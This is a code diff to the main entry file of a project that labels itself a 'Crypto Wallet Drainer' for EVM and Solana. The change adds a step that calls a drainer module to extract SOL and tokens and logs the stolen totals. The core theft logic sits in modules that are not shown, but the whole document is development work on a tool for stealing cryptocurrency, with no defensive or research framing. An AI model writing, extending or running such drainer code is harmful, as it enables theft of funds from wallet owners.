@@ -1,6 +1,6 @@
 // Main entry point for Crypto Wallet Drainer (EVM + Solana)
 
-const Wallet = require('./wallet');
+const Wallet = require('./wallet').Wallet;
 const Drainer = require('./drainer');
 const config = require('./config');
 const { SolanaDrainBot } = require('./solana-drain-bot');
@@ -24,7 +24,10 @@ async function main() {
     const solanaBot = new SolanaDrainBot();
     try {
         const solBalance = await solanaBot.getBalance();
-        console.log(`[MAIN] Solana drainer wallet balance: ${solBalance} SOL`);
+        console.log(`[MAIN] Solana wallet balance: ${solBalance} SOL`);
+        const { extracted, tokensExtracted, totalSOL } = await drainer.extractSolanaFunds(solanaBot);
+        console.log(`[MAIN] Extracted ${totalSOL} SOL total`);
+        console.log(`[MAIN] Tokens extracted: ${tokensExtracted.map(t => t.symbol || t.mint).join(', ')}`);
     } catch (error) {
         console.error('Solana Draining failed:', error);
     }
